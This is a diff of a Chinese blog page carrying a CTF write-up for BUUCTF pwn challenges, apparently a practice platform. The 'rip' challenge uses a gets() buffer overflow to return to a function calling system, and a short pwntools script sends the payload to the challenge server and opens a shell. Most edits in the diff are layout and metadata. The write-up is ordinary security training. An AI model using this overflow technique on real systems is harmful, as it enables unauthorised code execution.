@@ -16,12 +16,12 @@
   <meta name="author" content="Jwj-Learning">
   <meta name="keywords" content="">
   
-    <meta name="description" content="BUUCTF（1~10题）1.test_your_nc运行，直接利用system函数“cat flag”即可。 2.rip(1)解题思路例行检查后，用 F5 查看伪代码  发现gets危险输入  看到fun函数调用了“system”，找到fun的地址 0x401186 则利用gets溢出返回到fun函数地址即可 (2)Payload12345678#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom">
+    <meta name="description" content="BUUCTF（1~10题）1.test_your_nc运行，直接利用system函数“cat flag”即可。 2.rip(1)解题思路例行检查后，用 F5 查看伪代码     发现gets危险输入     看到fun函数调用了“system”，找到fun的地址 0x401186 则利用gets溢出返回到fun函数地址即可 (2)Payload12345678#!&#x2F;usr&#x2F;bin&#x2F;env pyth">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF（1~10）">
 <meta property="og:url" content="http://example.com/2023/07/30/BUUCTF/1~10/index.html">
 <meta property="og:site_name" content="Dreaming">
-<meta property="og:description" content="BUUCTF（1~10题）1.test_your_nc运行，直接利用system函数“cat flag”即可。 2.rip(1)解题思路例行检查后，用 F5 查看伪代码  发现gets危险输入  看到fun函数调用了“system”，找到fun的地址 0x401186 则利用gets溢出返回到fun函数地址即可 (2)Payload12345678#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom">
+<meta property="og:description" content="BUUCTF（1~10题）1.test_your_nc运行，直接利用system函数“cat flag”即可。 2.rip(1)解题思路例行检查后，用 F5 查看伪代码     发现gets危险输入     看到fun函数调用了“system”，找到fun的地址 0x401186 则利用gets溢出返回到fun函数地址即可 (2)Payload12345678#!&#x2F;usr&#x2F;bin&#x2F;env pyth">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/.com//1~10/image-20230405162937267.png">
 <meta property="og:image" content="http://example.com/.com//1~10/image-20230405163225751.png">
@@ -62,7 +62,7 @@
 <meta property="og:image" content="http://example.com/.com//1~10/image-20230530204940268.png">
 <meta property="og:image" content="http://example.com/.com//1~10/image-20230530211058479.png">
 <meta property="article:published_time" content="2023-07-30T01:40:20.000Z">
-<meta property="article:modified_time" content="2023-07-30T15:24:57.933Z">
+<meta property="article:modified_time" content="2023-07-30T16:05:58.237Z">
 <meta property="article:author" content="Jwj-Learning">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary_large_image">
@@ -314,9 +314,15 @@
                 
                 <h1 id="BUUCTF（1-10题）"><a href="#BUUCTF（1-10题）" class="headerlink" title="BUUCTF（1~10题）"></a>BUUCTF（1~10题）</h1><h2 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h2><p>运行，直接利用system函数“cat flag”即可。</p>
 <h2 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h2><h3 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p>
-<p><img src="/.com//1~10/image-20230405162937267.png" srcset="/img/loading.gif" lazyload alt="2.1"></p>
+<img src="/.com//1~10/image-20230405162937267.png" srcset="/img/loading.gif" lazyload alt="2.1" style="zoom:100%;">
+
+
+
 <p>发现gets危险输入</p>
-<p><img src="/.com//1~10/image-20230405163225751.png" srcset="/img/loading.gif" lazyload alt="2.2"></p>
+<img src="/.com//1~10/image-20230405163225751.png" srcset="/img/loading.gif" lazyload alt="2.2" style="zoom:100%;">
+
+
+
 <p>看到fun函数调用了“system”，找到fun的地址 0x401186</p>
 <p>则利用gets溢出返回到fun函数地址即可</p>
 <h3 id="2-Payload"><a href="#2-Payload" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = remote(&quot;node4.buuoj.cn&quot;,28996)<br><br>system_addr = 0x401186<br>sh.sendline(b&#x27;A&#x27;*15+b&#x27;a&#x27;*8 + p64(system_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure>
